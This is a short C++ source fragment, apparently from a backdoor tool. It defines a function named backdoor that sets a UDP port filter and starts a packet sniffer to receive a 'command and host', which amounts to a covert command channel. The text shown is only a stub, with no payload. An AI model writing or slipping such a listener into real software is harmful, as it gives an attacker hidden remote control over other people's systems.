#include <iostream>
#include <sstream>
#include <string>
#include "libpcap/pkt_sniffer.h"

int backdoor(int port){

    std::stringstream filter;
    filter << "udp and port " << port; 
    
    //receive command and host using amons libcap package
    int ctl_flag = 0;
    start_sniffer(-1, filter.str(), ctl_flag);

    return 1;
}